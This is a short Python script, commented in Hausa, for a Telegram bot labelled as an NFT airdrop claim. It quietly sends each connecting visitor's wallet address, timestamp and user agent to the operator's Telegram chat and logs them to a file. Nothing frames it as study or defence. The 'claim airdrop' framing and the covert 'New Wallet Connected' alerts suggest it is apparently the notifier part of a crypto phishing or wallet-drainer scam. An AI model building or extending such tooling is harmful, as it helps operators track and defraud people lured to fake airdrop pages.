#!/usr/bin/env python3
# ============================================================
# TELEGRAM BOT - DON CLAIM-NFT-AIRDROP
# ============================================================

import requests
import json
import time
import os
from datetime import datetime

# ============================================================
# CONFIGURATION
# ============================================================

# Saka BOT_TOKEN ɗinka anan (daga @BotFather)
BOT_TOKEN = "yeyeetey"

# Saka CHAT_ID ɗinka anan (daga @userinfobot)
CHAT_ID = "dhhdhdhd"

# Fayil ɗin da za a ajiye wallet addresses
WALLETS_FILE = "wallets_telegram.json"

# ============================================================
# FUNCTIONS
# ============================================================

def send_message(text):
    """Aika saƙo zuwa Telegram"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "HTML"
    }
    
    try:
        response = requests.post(url, json=data)
        if response.status_code == 200:
            print("✅ Message sent!")
            return True
        else:
            print(f"❌ Error: {response.text}")
            return False
    except Exception as e:
        print(f"❌ Error: {e}")
        return False

def send_wallet_alert(wallet_address, user_agent=""):
    """Aika sanarwar wallet"""
    message = f"""
🔔 <b>New Wallet Connected!</b>

📊 Wallet: <code>{wallet_address}</code>
🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📱 User Agent: {user_agent[:50]}
    """.strip()
    
    return send_message(message)

def save_wallet(wallet_address, user_agent=""):
    """Ajiye wallet address"""
    wallets = []
    if os.path.exists(WALLETS_FILE):
        try:
            with open(WALLETS_FILE, 'r') as f:
                wallets = json.load(f)
        except:
            pass
    
    wallets.append({
        "address": wallet_address,
        "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "user_agent": user_agent[:50]
    })
    
    with open(WALLETS_FILE, 'w') as f:
        json.dump(wallets, f, indent=2)
    
    print(f"✅ Wallet saved: {wallet_address}")

# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    print("🤖 Telegram Bot started!")
    send_message("🤖 Bot is running!")
